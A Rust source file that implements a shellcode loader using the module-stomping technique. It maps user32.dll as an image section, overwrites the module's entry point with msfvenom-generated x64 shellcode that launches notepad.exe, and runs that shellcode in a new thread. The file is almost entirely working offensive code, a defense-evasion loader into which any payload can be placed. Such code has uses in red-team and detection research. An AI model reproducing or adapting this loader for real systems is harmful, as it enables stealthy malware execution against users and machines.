use ntapi::ntmmapi::{NtMapViewOfSection, ViewShare};
use std::ffi::c_void;
use std::ptr::null_mut;
use windows::{
    core::s,
    Wdk::Storage::FileSystem::NtCreateSection,
    Win32::{
        Foundation::{GENERIC_READ, HANDLE},
        Storage::FileSystem::{CreateFileA, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_MODE, OPEN_EXISTING},
        System::{
            Diagnostics::Debug::IMAGE_NT_HEADERS64,
            Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS, PAGE_READWRITE},
            Memory::{PAGE_EXECUTE_READWRITE, PAGE_READONLY, SECTION_ALL_ACCESS, SEC_IMAGE},
            SystemServices::{IMAGE_DOS_HEADER, IMAGE_NT_SIGNATURE},
            Threading::{CreateThread, THREAD_CREATION_FLAGS},
        },
    },
};

// msfvenom -p windows/x64/exec CMD=notepad.exe -f rust
const SHELLCODE: [u8; 279] = [
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x6e, 0x6f, 0x74, 0x65, 0x70,
    0x61, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00,
];

fn main() {
    let address = load_file().expect("[!] load_file Failed With Status");
    let module = address.0;
    let entry_point = address.1;
    println!("[+] Base Address: {:?}", module);
    println!("[+] AddressOfEntryPoint: {:?}", entry_point);

    unsafe {
        println!("[+] Changing protection from AddressOfEntryPoint to PAGE_READWRITE");
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        VirtualProtect(entry_point,SHELLCODE.len(),PAGE_READWRITE,&mut old_protect).expect("[!] VirtualProtect Failed With Status");

        println!("[+] Copying Shellcode to AddressOfEntryPoint");
        std::ptr::copy_nonoverlapping(SHELLCODE.as_ptr(), entry_point as _, SHELLCODE.len());

        println!("[+] Back to the old protection");
        VirtualProtect(entry_point, SHELLCODE.len(), old_protect, &mut old_protect).expect("[!] VirtualProtect (2) Failed With Status");

        CreateThread(None,0,Some(std::mem::transmute(entry_point)),None,THREAD_CREATION_FLAGS(0), None).expect("[!] CreateThread Failed With Status");

        println!("[+] Shellcode Executed!!!");
        std::thread::sleep(std::time::Duration::from_secs(10));

    };
}

fn load_file() -> Result<(*mut c_void, *mut c_void), String> {
    unsafe {
        let h_file = CreateFileA(
            s!("C:\\Windows\\System32\\user32.dll"),
            GENERIC_READ.0,
            FILE_SHARE_MODE(0),
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        ).expect("CreateFile Failed With Status");

        let mut section = HANDLE::default();
        let status = NtCreateSection(
            &mut section,
            SECTION_ALL_ACCESS.0,
            None,
            None,
            PAGE_READONLY.0,
            SEC_IMAGE.0,
            h_file,
        );

        if status.is_err() {
            return Err("[!] NtCreateSection Failed".to_string());
        }

        let mut mapped_module: *mut ntapi::winapi::ctypes::c_void = null_mut();
        let mut view_size = 0;
        let status = NtMapViewOfSection(
            section.0 as _,
            0xffffffffffffffffu64 as _,
            &mut mapped_module,
            0,
            0,
            null_mut(),
            &mut view_size,
            ViewShare,
            0,
            PAGE_EXECUTE_READWRITE.0,
        );

        if status != 0 {
            return Err("[!] NtMapViewOfSection Failed".to_string());
        }

        let dos_header = mapped_module as *mut IMAGE_DOS_HEADER;
        let nt_header = (mapped_module as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
        if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
            return Err("IMAGE SIGNATURE INVALID".to_string());
        }

        let entry_point = (mapped_module as usize + (*nt_header).OptionalHeader.AddressOfEntryPoint as usize) as *mut c_void;
        Ok((mapped_module as *mut c_void, entry_point))
    }
}
